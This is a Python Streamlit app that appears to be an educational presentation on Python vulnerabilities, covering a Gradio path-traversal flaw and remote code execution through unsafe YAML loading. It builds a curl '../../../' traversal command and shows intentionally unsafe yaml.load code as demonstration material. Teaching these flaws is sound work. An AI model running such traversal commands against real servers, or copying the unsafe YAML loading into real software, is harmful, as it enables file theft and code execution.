import streamlit as st
import subprocess
from streamlit_ace import st_ace

st.set_page_config(
    layout="wide",
)
tab1, tab2, tab3 = st.tabs(
    ["Vulnerabilities & Exploits", "Path Traversal", "Remote Code Execution"]
)


with tab1:
    col1, col2 = st.columns(2)
    with col1:
        st.markdown(
            """
        ## Vulnerabilities, Bugs and Exploits in Python
        """
        )
        st.image("./pages/assets/vunerabilityvsbug.jpeg")
        st.markdown(
            """
        - SQL Injection
        - Deserialization
        - Remote Code Execution (RCE)
        - Path traversal or ../ 
        """
        )

    with col2:
        st.image("./pages/assets/cve_website.png")
        st.image("./pages/assets/SQL_injection.png")

with tab2:
    col1, col2 = st.columns(2)

    with col1:
        st.image("./pages/assets/gradio_cve.png")

        code_text = """ 
             import gradio as gr

             demo_img = "./pages/assets/skull-and-crossbones.png"
             
             def show_image(img):
                 return img
             
             app = gr.Interface(
                 fn=show_image,
                 inputs=gr.Image(label="Input Image Component", value=demo_img, height=800, width=800),
                 outputs=[gr.Image(label="Output Image Component", height=400, width=400, image_mode="L")]
             )
             
             app.launch(share=True)"""
        st.code(code_text)

        def run_py_script(script_name):
            command = ["python", "-u", script_name]
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
            )
            while process.poll() is None:
                line = process.stdout.readline()
                if not line:
                    continue
                st.write(line.strip())

        # When the user submits the script name, run the shell script
        if st.button("Run the gradio app"):
            run_py_script("gradio_app.py")

    with col2:
        dummy_cmd = st.text_input(
            label="file/path/from/gradio",
            placeholder="https://xxxxxx..xx.gradio.live/file=/tmp/gradio/xxxxx/",
        )
        st.write(
            "curl --list-only --path-as-is",
            dummy_cmd,
            "../../../path/to/asset.jpeg --output /attacker/home/path/image_copy.jpeg",
        )

        content = st_ace(language="css", theme="terminal", wrap=True)

        st.image("./pages/assets/gradio_demo.jpg")

    st.markdown("#")
    st.markdown("#")
    st.markdown("#")
    if st.button("Show Backup Screenshots"):
        st.image("./pages/assets/backup1.png")
        st.image("./pages/assets/backup2.png")
        st.image("./pages/assets/backup3.png")


with tab3:
    col1, col2 = st.columns(2)

    with col1:
        st.image("./pages/assets/yaml_cve.png")

        code_text = """ 
            import yaml
            from yaml import FullLoader
            from flask import Flask

            def load_config(filename):
                with open(filename, 'r') as file:
                    config_data = yaml.load(file, Loader=FullLoader)
                return config_data

            def start_server(config):
                app = Flask(__name__)

                # Apply server configuration
                app.run(host=config['server']['host'],
                        port=config['server']['port'],
                        debug=config['server']['debug'])

            config_data = load_config('totally_safe_file.yaml')
            start_server(config_data)"""
        st.code(code_text)

        # When the user submits the script name, run the shell script
        if st.button("Run the Flask app", key="roman_ace_button"):
            run_py_script("yaml_loader_ace.py")

    with col2:
        show_yaml = st.checkbox("Show yaml Content", value=False)
        with open("totally_safe_file.yaml", "r") as file:
            file_contents = file.read()
        if show_yaml:
            st.code(file_contents, language="yaml")
